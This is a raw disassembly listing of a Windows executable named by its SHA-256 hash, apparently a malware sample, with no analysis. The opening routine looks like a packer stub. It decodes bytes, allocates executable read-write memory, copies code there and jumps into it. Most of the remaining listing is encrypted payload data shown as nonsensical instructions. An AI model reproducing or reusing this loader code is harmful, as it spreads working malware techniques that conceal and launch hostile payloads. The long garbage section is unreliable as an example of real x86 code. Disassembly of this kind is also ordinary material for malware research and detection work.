
7b9ab9dbd9d8d8a69d69304d3bc53ab22454e3f7746b03ae9c5d1481d0c4329f.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0x8
  411003:	push   ebx
  411004:	push   ebp
  411005:	mov    ebp,DWORD PTR [esp+0x20]
  411009:	push   esi
  41100a:	xor    eax,eax
  41100c:	push   edi
  41100d:	mov    edi,DWORD PTR [esp+0x1c]
  411011:	mov    DWORD PTR [esp+0x10],eax
  411015:	mov    esi,0xfffffffd
  41101a:	mov    DWORD PTR [esp+0x14],0x1
  411022:	mov    ecx,DWORD PTR [esp+0x20]
  411026:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41102a:	add    esi,0x2
  41102d:	inc    esi
  41102e:	mov    BYTE PTR [esi+edi*1],cl
  411031:	movzx  ecx,BYTE PTR [eax+ebp*1]
  411035:	mov    edx,DWORD PTR [esp+0x10]
  411039:	mov    eax,DWORD PTR [esp+0x14]
  41103d:	add    edx,eax
  41103f:	mov    DWORD PTR [esp+0x10],edx
  411043:	ror    eax,cl
  411045:	mov    eax,DWORD PTR [esp+0x10]
  411049:	mov    edx,eax
  41104b:	shr    edx,0x3
  41104e:	mov    ebx,0x1
  411053:	sub    ebx,edx
  411055:	imul   eax,ebx
  411058:	mov    DWORD PTR [esp+0x10],eax
  41105c:	shl    ebx,0x3
  41105f:	mov    bl,BYTE PTR [esi+edi*1]
  411062:	add    bl,cl
  411064:	mov    ecx,DWORD PTR [esp+0x24]
  411068:	mov    BYTE PTR [esi+edi*1],bl
  41106b:	sub    esi,0x2
  41106e:	cmp    esi,ecx
  411070:	jl     0x411022
  411072:	pop    edi
  411073:	pop    esi
  411074:	pop    ebp
  411075:	pop    ebx
  411076:	add    esp,0x8
  411079:	ret    
  41107a:	nop
  41107b:	nop
  41107c:	nop
  41107d:	nop
  41107e:	nop
  41107f:	nop
  411080:	push   ebp
  411081:	mov    ebp,esp
  411083:	sub    esp,0x70
  411086:	mov    DWORD PTR [ebp-0x8],0x0
  41108d:	mov    DWORD PTR [ebp-0x70],0x0
  411094:	mov    DWORD PTR [ebp-0x58],0x0
  41109b:	mov    DWORD PTR [ebp-0x5c],0x0
  4110a2:	mov    DWORD PTR [ebp-0x48],0x0
  4110a9:	mov    DWORD PTR [ebp-0x6c],0x0
  4110b0:	mov    DWORD PTR [ebp-0x68],0x0
  4110b7:	mov    DWORD PTR [ebp-0x10],0x0
  4110be:	mov    DWORD PTR [ebp-0x60],0x0
  4110c5:	mov    DWORD PTR [ebp-0x18],0x0
  4110cc:	mov    DWORD PTR [ebp-0xc],0x0
  4110d3:	mov    DWORD PTR [ebp-0x30],0x0
  4110da:	mov    DWORD PTR [ebp-0x2c],0x0
  4110e1:	mov    DWORD PTR [ebp-0x14],0x0
  4110e8:	mov    DWORD PTR [ebp-0x4],0x0
  4110ef:	mov    DWORD PTR [ebp-0x54],0x0
  4110f6:	mov    DWORD PTR [ebp-0x50],0x0
  4110fd:	mov    DWORD PTR [ebp-0x4c],0x0
  411104:	mov    eax,ds:0x429160
  411109:	mov    DWORD PTR [ebp-0x28],eax
  41110c:	mov    ecx,DWORD PTR ds:0x429164
  411112:	mov    DWORD PTR [ebp-0x24],ecx
  411115:	mov    edx,DWORD PTR ds:0x429168
  41111b:	mov    DWORD PTR [ebp-0x20],edx
  41111e:	mov    al,ds:0x42916c
  411123:	mov    BYTE PTR [ebp-0x1c],al
  411126:	mov    ecx,DWORD PTR ds:0x429150
  41112c:	mov    DWORD PTR [ebp-0x40],ecx
  41112f:	mov    edx,DWORD PTR ds:0x429154
  411135:	mov    DWORD PTR [ebp-0x3c],edx
  411138:	mov    eax,ds:0x429158
  41113d:	mov    DWORD PTR [ebp-0x38],eax
  411140:	mov    cx,WORD PTR ds:0x42915c
  411147:	mov    WORD PTR [ebp-0x34],cx
  41114b:	mov    dl,BYTE PTR ds:0x42915e
  411151:	mov    BYTE PTR [ebp-0x32],dl
  411154:	mov    DWORD PTR [ebp-0x2c],0x40
  41115b:	call   DWORD PTR ds:0x42901c
  411161:	mov    eax,DWORD PTR [ebp-0x70]
  411164:	push   eax
  411165:	call   DWORD PTR ds:0x429018
  41116b:	lea    ecx,[ebp-0x10]
  41116e:	push   ecx
  41116f:	lea    edx,[ebp-0x18]
  411172:	push   edx
  411173:	call   DWORD PTR ds:0x429000
  411179:	test   eax,eax
  41117b:	jne    0x4111a5
  41117d:	push   0x0
  41117f:	push   0x14
  411181:	push   0x14
  411183:	push   0xa
  411185:	push   0xa
  411187:	push   0x0
  411189:	push   0x0
  41118b:	push   0x14
  41118d:	push   0x14
  41118f:	push   0xa
  411191:	push   0xa
  411193:	push   0x0
  411195:	push   0x0
  411197:	call   0x424352
  41119c:	mov    eax,DWORD PTR [ebp-0x10]
  41119f:	add    eax,0x1
  4111a2:	mov    DWORD PTR [ebp-0x10],eax
  4111a5:	mov    BYTE PTR [ebp-0x40],0x56
  4111a9:	call   DWORD PTR ds:0x429034
  4111af:	mov    DWORD PTR [ebp-0x30],eax
  4111b2:	mov    BYTE PTR [ebp-0x3e],0x72
  4111b6:	movzx  ecx,WORD PTR [ebp-0x30]
  4111ba:	test   ecx,ecx
  4111bc:	jne    0x411210
  4111be:	mov    BYTE PTR [ebp-0x34],0x0
  4111c2:	mov    DWORD PTR [ebp-0x18],0xe0d
  4111c9:	lea    edx,[ebp-0x28]
  4111cc:	push   edx
  4111cd:	call   DWORD PTR ds:0x429044
  4111d3:	mov    DWORD PTR [ebp-0x60],eax
  4111d6:	mov    DWORD PTR [ebp-0x50],0x3a
  4111dd:	lea    eax,[ebp-0x40]
  4111e0:	push   eax
  4111e1:	mov    ecx,DWORD PTR [ebp-0x60]
  4111e4:	push   ecx
  4111e5:	call   DWORD PTR ds:0x429048
  4111eb:	mov    DWORD PTR [ebp-0x44],eax
  4111ee:	mov    DWORD PTR [ebp-0x4],0xad68b68f
  4111f5:	push   0x0
  4111f7:	push   0x14
  4111f9:	push   0x14
  4111fb:	push   0xa
  4111fd:	push   0xa
  4111ff:	push   0x0
  411201:	call   DWORD PTR ds:0x42900c
  411207:	mov    DWORD PTR [ebp-0x6c],0x10ebff
  41120e:	jmp    0x411225
  411210:	mov    BYTE PTR ds:0x447ac8,0x0
  411217:	mov    BYTE PTR ds:0x42d6a0,0x0
  41121e:	mov    BYTE PTR ds:0x443dd8,0x0
  411225:	push   0x0
  411227:	call   DWORD PTR ds:0x429140
  41122d:	push   DWORD PTR ds:0x429044
  411233:	pop    edx
  411234:	mov    DWORD PTR [ebp-0x68],edx
  411237:	mov    edx,DWORD PTR [ebp-0x70]
  41123a:	push   edx
  41123b:	call   DWORD PTR ds:0x429050
  411241:	mov    DWORD PTR [ebp-0x30],0x410000
  411248:	push   DWORD PTR [ebp-0x2c]
  41124b:	push   0x1000
  411250:	mov    eax,DWORD PTR [ebp-0x18]
  411253:	add    eax,0x23
  411256:	add    eax,0x23
  411259:	push   eax
  41125a:	xor    eax,eax
  41125c:	push   eax
  41125d:	mov    ecx,DWORD PTR [ebp-0x44]
  411260:	call   ecx
  411262:	mov    edx,eax
  411264:	mov    DWORD PTR [ebp-0x8],edx
  411267:	mov    eax,DWORD PTR [ebp-0x6c]
  41126a:	sub    eax,0xdae0b
  41126f:	mov    DWORD PTR [ebp-0x6c],eax
  411272:	cmp    DWORD PTR [ebp-0x8],0x0
  411276:	jne    0x411286
  411278:	push   0x0
  41127a:	call   0x42434c
  41127f:	mov    BYTE PTR ds:0x443dd8,0x0
  411286:	mov    ecx,DWORD PTR [ebp-0x8]
  411289:	add    ecx,DWORD PTR [ebp-0x18]
  41128c:	mov    edx,DWORD PTR [ebp-0x4]
  41128f:	mov    DWORD PTR [ecx],edx
  411291:	mov    eax,DWORD PTR [ebp-0x8]
  411294:	add    eax,DWORD PTR [ebp-0x50]
  411297:	mov    DWORD PTR [ebp-0x5c],eax
  41129a:	mov    ecx,DWORD PTR ds:0x429048
  4112a0:	mov    DWORD PTR [ebp-0x4c],ecx
  4112a3:	mov    edx,DWORD PTR [ebp-0x8]
  4112a6:	add    edx,DWORD PTR [ebp-0x18]
  4112a9:	mov    eax,DWORD PTR [ebp+0x8]
  4112ac:	mov    DWORD PTR [edx+0x4],eax
  4112af:	mov    ecx,DWORD PTR [ebp-0x8]
  4112b2:	add    ecx,DWORD PTR [ebp-0x18]
  4112b5:	mov    DWORD PTR [ebp-0xc],ecx
  4112b8:	push   0x8000
  4112bd:	push   0x0
  4112bf:	mov    edx,DWORD PTR [ebp-0x70]
  4112c2:	push   edx
  4112c3:	call   DWORD PTR ds:0x42904c
  4112c9:	cmp    DWORD PTR [ebp-0x6c],0x0
  4112cd:	jbe    0x4112ea
  4112cf:	mov    eax,DWORD PTR [ebp-0xc]
  4112d2:	push   eax
  4112d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4112d6:	push   ecx
  4112d7:	mov    edx,DWORD PTR [ebp-0x30]
  4112da:	add    edx,DWORD PTR [ebp-0x6c]
  4112dd:	push   edx
  4112de:	mov    eax,DWORD PTR [ebp-0x8]
  4112e1:	push   eax
  4112e2:	call   0x411000
  4112e7:	add    esp,0x10
  4112ea:	mov    ecx,DWORD PTR [ebp-0x70]
  4112ed:	push   ecx
  4112ee:	call   DWORD PTR ds:0x429144
  4112f4:	cmp    DWORD PTR [ebp-0x5c],0x0
  4112f8:	je     0x41130b
  4112fa:	push   DWORD PTR [ebp-0x4c]
  4112fd:	push   DWORD PTR [ebp-0x68]
  411300:	mov    edx,DWORD PTR [ebp-0x5c]
  411303:	push   eax
  411304:	jmp    edx
  411306:	jmp    0x422dee
  41130b:	mov    edx,DWORD PTR [ebp+0x8]
  41130e:	mov    DWORD PTR [ebp-0x14],edx
  411311:	push   0x0
  411313:	push   0x1
  411315:	mov    eax,DWORD PTR [ebp-0x60]
  411318:	push   eax
  411319:	call   DWORD PTR ds:0x429058
  41131f:	es inc eax
  411321:	(bad)  
  411322:	add    al,0x47
  411324:	or     BYTE PTR [ecx+0x17],dl
  411327:	and    eax,0x2c5c46ad
  41132c:	mov    eax,ds:0x16ffdf88
  411331:	jb     0x4112dc
  411333:	mov    WORD PTR [edi],cs
  411335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411337:	push   edi
  411338:	test   eax,0x7005ce3a
  41133d:	out    dx,al
  41133e:	mov    bl,0xb4
  411340:	dec    esp
  411341:	ja     0x411345
  411343:	and    al,dh
  411345:	push   esi
  411346:	in     eax,0xbf
  411348:	sub    al,0xd3
  41134a:	jmp    0xb72:0x84bd3e4
  411351:	xor    al,0xc
  411353:	adc    edx,esp
  411355:	addr16 pushf 
  411357:	call   0xaa3a1d6e
  41135c:	xchg   ebx,eax
  41135d:	cmp    eax,0x221989aa
  411362:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  411364:	sbb    ebp,esi
  411366:	xchg   ebp,eax
  411367:	sti    
  411368:	not    DWORD PTR [ecx-0x728cb8d5]
  41136e:	dec    edx
  41136f:	gs inc edx
  411371:	out    0xfb,eax
  411373:	add    al,0x4b
  411375:	mov    ebp,0xa5aaa75e
  41137a:	cmp    cl,BYTE PTR [edx-0x7257e042]
  411380:	sbb    eax,0x217cf75b
  411385:	adc    al,0xf3
  411387:	mov    dh,0x17
  411389:	mov    cs,WORD PTR [eax+0x25]
  41138c:	int3   
  41138d:	addr16 or al,0xef
  411390:	jns    0x411332
  411392:	test   eax,0x732d8c98
  411397:	jmp    0x884b:0x109a5b67
  41139e:	push   0x4d
  4113a0:	shr    DWORD PTR [ecx-0x17549d1a],cl
  4113a6:	nop
  4113a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a8:	je     0x411419
  4113aa:	pop    ebp
  4113ab:	idiv   DWORD PTR [edi+0x1c]
  4113ae:	jge    0x411367
  4113b0:	(bad)  
  4113b1:	push   ecx
  4113b2:	sti    
  4113b3:	add    BYTE PTR [ecx+0x573b351c],bh
  4113b9:	xchg   ebx,eax
  4113ba:	mov    ah,0xde
  4113bc:	mov    es,eax
  4113be:	mov    ch,0xc1
  4113c0:	rol    BYTE PTR [eax+0x5cbcef8a],0x45
  4113c7:	dec    ebp
  4113c8:	mov    bl,0x61
  4113ca:	jge    0x4113ba
  4113cc:	fwait
  4113cd:	in     eax,0xe4
  4113cf:	mov    ds:0x1d7b4d00,al
  4113d4:	ret    
  4113d5:	add    BYTE PTR [ebp+0x793b682c],al
  4113db:	fist   WORD PTR [ebp-0x35]
  4113de:	add    DWORD PTR [edx+0x29],edx
  4113e1:	cs jge 0x4113ed
  4113e4:	out    dx,al
  4113e5:	test   DWORD PTR [eax-0x59424d24],esi
  4113eb:	mov    eax,ds:0x57ff98c3
  4113f0:	aaa    
  4113f1:	push   es
  4113f2:	leave  
  4113f3:	jl     0x4113ac
  4113f5:	or     al,0x7f
  4113f7:	push   ebp
  4113f8:	mov    ebx,0xebb6cf71
  4113fd:	les    edx,FWORD PTR [esi]
  4113ff:	in     al,0x0
  411401:	dec    ecx
  411402:	adc    al,0xa7
  411404:	ja     0x4113d8
  411406:	mov    BYTE PTR [esi+edx*4],ch
  411409:	in     eax,0x43
  41140b:	mov    eax,DWORD PTR [esi-0x67284022]
  411411:	jnp    0x411453
  411413:	pop    edi
  411414:	cmp    BYTE PTR [ebp-0x1b096636],bh
  41141a:	aaa    
  41141b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41141c:	or     DWORD PTR [ebx+0x44861bf3],ecx
  411422:	push   ecx
  411423:	or     bh,al
  411425:	pop    eax
  411426:	mov    ds:0x10f365ef,al
  41142b:	inc    eax
  41142c:	arpl   WORD PTR [edi],bp
  41142e:	mov    WORD PTR [edx+eax*4+0x38d928f4],?
  411435:	cmp    ebp,DWORD PTR [ebx]
  411437:	inc    edi
  411438:	jle    0x4114b1
  41143a:	ror    ch,0xbc
  41143d:	inc    esi
  41143e:	add    al,0x39
  411440:	dec    esi
  411441:	add    bl,BYTE PTR [ecx]
  411443:	inc    edi
  411444:	add    eax,0xf4c68ac9
  411449:	or     al,0x5c
  41144b:	cmc    
  41144c:	adc    eax,0x3c8517c5
  411451:	clc    
  411452:	add    al,0xd5
  411454:	fwait
  411455:	retf   
  411456:	repnz into 
  411458:	pop    ebx
  411459:	pop    eax
  41145a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41145b:	push   ebp
  41145c:	cwde   
  41145d:	xchg   esp,eax
  41145e:	mov    ?,ebx
  411460:	ja     0x411459
  411462:	jmp    0x93e8cc8d
  411467:	pop    ecx
  411468:	vmovntdqa ymm3,YMMWORD PTR [ebx]
  41146d:	lahf   
  41146e:	sub    ebp,DWORD PTR [edx-0x71]
  411471:	mov    dh,0x35
  411473:	mov    ah,0xf4
  411475:	lds    ebp,FWORD PTR [ebp-0x26]
  411478:	jp     0x4114eb
  41147a:	inc    esp
  41147b:	inc    ebp
  41147c:	lods   al,BYTE PTR gs:[esi]
  41147e:	mov    ebx,0x9ab9a2cb
  411483:	imul   edx,DWORD PTR [ebp-0x25],0xe144562c
  41148a:	sub    DWORD PTR [ecx],eax
  41148c:	ret    0x8b28
  41148f:	rcl    DWORD PTR [edi],0x2b
  411492:	aaa    
  411493:	dec    ebx
  411494:	jle    0x411442
  411496:	push   esp
  411497:	push   edx
  411498:	push   ebp
  411499:	xchg   BYTE PTR [eax],bh
  41149b:	xchg   BYTE PTR [edx+0x147cdfb7],dh
  4114a1:	test   al,0x81
  4114a3:	pop    edx
  4114a4:	mov    edi,0x70ae8c36
  4114a9:	sbb    ebp,DWORD PTR [eax]
  4114ab:	push   ds
  4114ac:	and    al,0x79
  4114ae:	loope  0x41146c
  4114b0:	mov    eax,ds:0x98ea7d52
  4114b5:	sbb    eax,0x11b5bb83
  4114ba:	or     bl,bh
  4114bc:	cwde   
  4114bd:	les    edx,FWORD PTR [esi+0x65]
  4114c0:	mov    edx,0x512221fa
  4114c5:	ja     0x4114d2
  4114c7:	gs repz and eax,0x91e887f9
  4114ce:	mov    edi,0x681c219b
  4114d3:	fsubp  st(5),st
  4114d5:	pop    edi
  4114d6:	jle    0x41148c
  4114d8:	dec    esi
  4114d9:	mov    ?,WORD PTR [ebx]
  4114db:	add    BYTE PTR [eax+0xef037e1],ch
  4114e1:	cmp    BYTE PTR [esi],bh
  4114e3:	add    dh,bl
  4114e5:	pop    ds
  4114e6:	jmp    0x411525
  4114e8:	xchg   esi,eax
  4114e9:	jge    0x411545
  4114eb:	pop    ecx
  4114ec:	shl    bl,1
  4114ee:	sbb    BYTE PTR [ebx],cl
  4114f0:	jb     0x41156b
  4114f2:	clc    
  4114f3:	cmc    
  4114f4:	fxch   st(7)
  4114f6:	or     al,0xa5
  4114f8:	scas   al,BYTE PTR es:[edi]
  4114f9:	dec    ebx
  4114fa:	hlt    
  4114fb:	(bad)  
  4114fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114fd:	push   ecx
  4114fe:	sbb    eax,0xf30ab348
  411503:	cld    
  411504:	adc    DWORD PTR [ebp+0x48],ebx
  411507:	sbb    eax,0xa7132fb1
  41150c:	cs aaa 
  41150e:	test   BYTE PTR [edx+eiz*1],0xb6
  411512:	inc    ebp
  411513:	jb     0x4114ca
  411515:	push   ds
  411516:	lods   al,BYTE PTR ds:[esi]
  411517:	cwde   
  411518:	jmp    0xbbd6:0x19e3f27f
  41151f:	popa   
  411520:	in     al,dx
  411521:	pop    esi
  411522:	xchg   esi,eax
  411523:	js     0x411507
  411525:	pop    ecx
  411526:	xor    eax,0x569651ab
  41152b:	mov    dl,0xc
  41152d:	iret   
  41152e:	jmp    0xb453c932
  411533:	iret   
  411534:	cdq    
  411535:	popf   
  411536:	push   ebp
  411537:	sub    esi,DWORD PTR [edi+ebx*2-0x3f1f59b0]
  41153e:	cld    
  41153f:	test   DWORD PTR [esi+esi*4-0x1bd3efc2],0xd062b3f9
  41154a:	ss sub al,0xb4
  41154d:	fs cs cwde 
  411550:	dec    ebp
  411551:	mov    eax,ds:0x6bdfdd00
  411556:	mov    BYTE PTR [ecx-0x28],bl
  411559:	jg     0x411504
  41155b:	js     0x411555
  41155d:	add    eax,0x786fa3a8
  411562:	xlat   BYTE PTR ds:[ebx]
  411563:	in     eax,0xf4
  411565:	sub    edx,edi
  411567:	lahf   
  411568:	mov    ds:0x6860f2b9,eax
  41156d:	lahf   
  41156e:	xlat   BYTE PTR ds:[ebx]
  41156f:	inc    edx
  411570:	mov    ebp,0xe15c3e14
  411575:	push   esp
  411576:	repz xor DWORD PTR [edx],edx
  411579:	adc    eax,0x8087a279
  41157e:	add    al,0x98
  411580:	cmc    
  411581:	loope  0x411518
  411583:	or     BYTE PTR [ecx+0x53a670c6],0xe6
  41158a:	dec    esp
  41158b:	stos   BYTE PTR es:[edi],al
  41158c:	adc    al,0xd1
  41158e:	cmp    al,0x92
  411590:	xchg   esi,eax
  411591:	dec    ebx
  411592:	adc    DWORD PTR [ebx+eax*4-0x4f821462],ebp
  411599:	out    0xc3,al
  41159b:	push   edi
  41159c:	sub    DWORD PTR [ecx],ebx
  41159e:	cdq    
  41159f:	mov    ds:0x998ade36,al
  4115a4:	pop    ds
  4115a5:	adc    eax,0x4d6bf5c5
  4115aa:	and    BYTE PTR [esi+0x2f51c6dd],cl
  4115b0:	push   0xfffffffd
  4115b2:	push   esi
  4115b3:	aam    0x68
  4115b5:	mov    ds:0xc8583e72,al
  4115ba:	push   ds
  4115bb:	fistp  QWORD PTR [ebp+0x6f149f57]
  4115c1:	mov    ds:0x90b342d5,al
  4115c6:	(bad)  
  4115c7:	mov    edi,0x24a866e8
  4115cc:	xchg   ecx,eax
  4115cd:	sub    al,0x79
  4115cf:	and    DWORD PTR [ecx-0x2a950345],0x5
  4115d6:	pop    edi
  4115d7:	xchg   ecx,eax
  4115d8:	(bad)  
  4115da:	dec    esp
  4115db:	shr    BYTE PTR [esi+0x7531020f],cl
  4115e1:	inc    esp
  4115e2:	mov    ecx,0x4f8f4ce5
  4115e7:	fsub   DWORD PTR [esi]
  4115e9:	gs mov bl,0x46
  4115ec:	cs push esi
  4115ee:	add    dh,0x7f
  4115f1:	or     al,0x38
  4115f3:	mov    gs,WORD PTR [edx]
  4115f5:	jge    0x411623
  4115f7:	ret    0xb0ec
  4115fa:	pop    ds
  4115fb:	inc    edi
  4115fc:	mov    esi,0x2d21474f
  411601:	add    eax,0x3ce76bbf
  411606:	jbe    0x4115d4
  411608:	(bad)  
  41160a:	mov    dl,0x15
  41160c:	and    dl,dl
  41160e:	outs   dx,DWORD PTR ds:[esi]
  41160f:	pop    ebp
  411610:	pop    eax
  411611:	lahf   
  411612:	daa    
  411613:	pop    esp
  411614:	movq   mm5,QWORD PTR [esi]
  411617:	ja     0x411633
  411619:	mov    ebx,0x393222a
  41161e:	push   0x2a13854
  411623:	das    
  411624:	add    eax,0x24373b7f
  411629:	cld    
  41162a:	adc    dl,dl
  41162c:	ds jno 0x411617
  41162f:	push   cs
  411630:	mov    bh,0xf6
  411632:	push   edi
  411633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411634:	test   al,0x23
  411636:	adc    BYTE PTR [esi+esi*1+0x2b439f1e],ch
  41163d:	mov    ebx,0xa3d08459
  411642:	dec    edx
  411643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411644:	cdq    
  411645:	push   ss
  411646:	inc    BYTE PTR [ebx+0x1f]
  411649:	outs   dx,DWORD PTR ds:[esi]
  41164a:	bnd call 0xc9a8a3b5
  411650:	gs (bad) 
  411652:	je     0x4115f2
  411654:	and    eax,0x93c7df0e
  411659:	maxps  xmm2,XMMWORD PTR ds:0xf4c0b058
  411660:	mov    edx,0xde01e867
  411665:	sub    dh,ah
  411667:	sub    al,0x52
  411669:	aas    
  41166a:	inc    edx
  41166b:	outs   dx,DWORD PTR ds:[esi]
  41166c:	sub    al,0xac
  41166e:	shr    BYTE PTR [edx],0x5f
  411671:	add    DWORD PTR [ebp+0xd],ebp
  411674:	sub    ecx,DWORD PTR [ebp+0x3810be34]
  41167a:	out    0x35,eax
  41167c:	stc    
  41167d:	lods   al,BYTE PTR ds:[esi]
  41167e:	pop    ecx
  41167f:	aad    0x3f
  411681:	sahf   
  411682:	cld    
  411683:	xchg   edi,eax
  411684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411685:	jnp    0x41168d
  411687:	cwde   
  411688:	dec    edx
  411689:	out    0xa0,eax
  41168b:	jns    0x411647
  41168d:	xor    ah,BYTE PTR [ebx-0x5ab50af2]
  411693:	outs   dx,DWORD PTR ds:[esi]
  411694:	ret    0xf881
  411697:	ins    DWORD PTR es:[edi],dx
  411698:	mov    ds,WORD PTR [eax+0x65]
  41169b:	inc    esp
  41169c:	pop    ebp
  41169d:	and    al,0x21
  41169f:	push   ds
  4116a0:	ins    BYTE PTR es:[edi],dx
  4116a1:	fwait
  4116a2:	xchg   esi,eax
  4116a3:	sub    ebx,DWORD PTR [ebx+0x11a6c3fa]
  4116a9:	jne    0x41164a
  4116ab:	std    
  4116ac:	fstp   TBYTE PTR [esi+0x5a]
  4116af:	inc    ecx
  4116b0:	xchg   esi,eax
  4116b1:	std    
  4116b2:	jmp    0xf1953ec8
  4116b7:	lods   al,BYTE PTR ds:[esi]
  4116b8:	sbb    al,0xf1
  4116ba:	pop    edx
  4116bb:	stos   DWORD PTR es:[edi],eax
  4116bc:	dec    edi
  4116bd:	ins    DWORD PTR es:[edi],dx
  4116be:	aaa    
  4116bf:	pop    es
  4116c0:	push   ds
  4116c1:	dec    edx
  4116c2:	lea    ecx,[ecx+esi*1]
  4116c5:	and    al,0x4d
  4116c7:	nop
  4116c8:	inc    ebp
  4116c9:	fstp   TBYTE PTR [edi]
  4116cb:	inc    ebp
  4116cc:	out    dx,al
  4116cd:	and    al,0x2a
  4116cf:	xchg   DWORD PTR [ebp+0x67],ebp
  4116d2:	add    eax,0xfa81d976
  4116d7:	lea    ecx,[ebp+0x701f9870]
  4116dd:	adc    dh,bh
  4116df:	push   0xffffffd8
  4116e1:	push   esi
  4116e2:	jmp    FWORD PTR ds:0xa14f7712
  4116e8:	fld    QWORD PTR [ebp-0x12]
  4116eb:	out    0x58,al
  4116ed:	hlt    
  4116ee:	inc    esp
  4116ef:	inc    edi
  4116f0:	popa   
  4116f1:	cli    
  4116f2:	push   ds
  4116f3:	(bad)  es:[edi-0x2a]
  4116f7:	jp     0x41176c
  4116f9:	xchg   ebp,eax
  4116fa:	sbb    al,0x22
  4116fc:	arpl   WORD PTR [ebx+ecx*1],cx
  4116ff:	sti    
  411700:	(bad)  
  411701:	and    dl,BYTE PTR [esi+0x2c9c9db9]
  411707:	inc    ecx
  411708:	push   ss
  411709:	xor    DWORD PTR [esp+edi*1-0x4],esi
  41170d:	std    
  41170e:	dec    ecx
  41170f:	mov    ds:0xacd983d6,al
  411714:	into   
  411715:	stc    
  411716:	pop    ecx
  411717:	adc    dl,ch
  411719:	push   cs
  41171a:	push   esi
  41171b:	mov    al,0xf4
  41171d:	loop   0x411718
  41171f:	xchg   esi,eax
  411720:	jmp    0x45ea:0x66e77e51
  411727:	mov    eax,ds:0xfd46eb2f
  41172c:	inc    esi
  41172d:	out    dx,al
  41172e:	hlt    
  41172f:	stos   DWORD PTR es:[edi],eax
  411730:	fstp   DWORD PTR [ebx-0x6a42f139]
  411736:	icebp  
  411737:	movntps XMMWORD PTR [esi],xmm5
  41173a:	fnstenv [esp+esi*1]
  41173d:	call   0xc9fa:0x7342029
  411744:	nop
  411745:	shl    DWORD PTR [edx+ebp*4],0x8f
  411749:	and    edi,ecx
  41174b:	(bad)  
  41174c:	mov    edx,0x88c01135
  411751:	mov    ebp,0xc459bbdd
  411756:	mov    eax,ss:0xa8fd83b
  41175c:	in     eax,dx
  41175d:	mov    edx,0x85f49d4b
  411762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411763:	inc    eax
  411764:	int    0xf3
  411766:	fisub  DWORD PTR [edi]
  411768:	mov    cl,0xa
  41176a:	je     0x41176b
  41176c:	idiv   DWORD PTR [edi+ecx*1-0x7c823a64]
  411773:	dec    esp
  411774:	mov    ds:0x344b259c,eax
  411779:	(bad)  
  41177a:	nop
  41177b:	mov    bl,0x48
  41177d:	inc    esp
  41177e:	dec    edi
  41177f:	add    al,BYTE PTR [ebx]
  411781:	iret   
  411782:	push   ds
  411783:	jmp    0x934b:0x7c15f256
  41178a:	or     esi,edi
  41178c:	jae    0x4117df
  41178e:	aaa    
  41178f:	cmp    edx,esi
  411791:	fdivr  QWORD PTR ds:0xc54a72a7
  411797:	mov    edx,0x3635e5dd
  41179c:	fsubr  DWORD PTR [ebp+ecx*1-0x69dd3eed]
  4117a3:	xchg   ecx,eax
  4117a4:	(bad)  
  4117a5:	pop    eax
  4117a6:	ss das 
  4117a8:	mov    al,0x8e
  4117aa:	scas   al,BYTE PTR es:[edi]
  4117ab:	push   ecx
  4117ac:	inc    esi
  4117ad:	daa    
  4117ae:	addr16 test eax,0xe3ead48e
  4117b4:	jo     0x4117d0
  4117b6:	leave  
  4117b7:	ss mov esi,0x152cff55
  4117bd:	(bad)  
  4117be:	fld    TBYTE PTR [ebp+ecx*2-0x22c3f251]
  4117c5:	dec    eax
  4117c6:	mov    edx,0xee25df40
  4117cb:	mov    ebp,0x1c1142db
  4117d0:	push   esp
  4117d1:	mov    dh,0x12
  4117d3:	jns    0x411825
  4117d5:	fst    QWORD PTR [ebp+eiz*8+0x4e1315a7]
  4117dc:	std    
  4117dd:	stc    
  4117de:	out    dx,al
  4117df:	outs   dx,BYTE PTR ds:[esi]
  4117e0:	adc    al,0x40
  4117e2:	test   DWORD PTR [edx+0x6b97d622],0x21a953d6
  4117ec:	mov    dh,0x15
  4117ee:	jmp    0x9c67e4f0
  4117f3:	jno    0x411790
  4117f5:	xchg   BYTE PTR [eax],ch
  4117f7:	push   edi
  4117f8:	fsub   QWORD PTR [esi-0x80]
  4117fb:	cmp    bl,al
  4117fd:	or     al,0xaf
  4117ff:	mov    BYTE PTR [edx-0x67],cl
  411802:	xchg   DWORD PTR [ecx-0x1b],eax
  411805:	cmp    bl,BYTE PTR [edi+0x4b]
  411808:	cmp    DWORD PTR [eax+0x5bc5c73a],0x1b
  41180f:	int3   
  411810:	xor    bh,BYTE PTR [esi+0x73]
  411813:	icebp  
  411814:	mov    ss,WORD PTR [ecx*8+0x5cd1be7d]
  41181b:	adc    edi,DWORD PTR [ebx+0x3c1a196f]
  411821:	mov    bh,0xe
  411823:	in     eax,0x4f
  411825:	pop    ebp
  411826:	enter  0x69bd,0x47
  41182a:	je     0x4117bf
  41182c:	call   0xb357:0x8708a49d
  411833:	cmp    DWORD PTR [ebp+0x46],edi
  411836:	dec    edi
  411837:	sbb    al,0x45
  411839:	cmp    bh,BYTE PTR [edx-0x1d9cb23b]
  41183f:	aad    0x89
  411841:	jmp    0x386bf7db
  411846:	mov    fs,WORD PTR ds:0x612e79ed
  41184c:	test   ebx,edx
  41184e:	mov    al,ds:0xf7d59a94
  411853:	jno    0x411818
  411855:	lods   eax,DWORD PTR ds:[esi]
  411856:	xchg   DWORD PTR [eax+0x7],ebx
  411859:	(bad)  
  41185a:	hlt    
  41185b:	js     0x41186b
  41185d:	pop    es
  41185e:	shl    DWORD PTR [eax-0x56],1
  411861:	les    ebp,FWORD PTR [esi-0x45f40507]
  411867:	ret    
  411868:	mov    al,ds:0x5d9174bc
  41186d:	xor    eax,0x8cd77748
  411872:	adc    al,0xfb
  411874:	outs   dx,BYTE PTR ds:[esi]
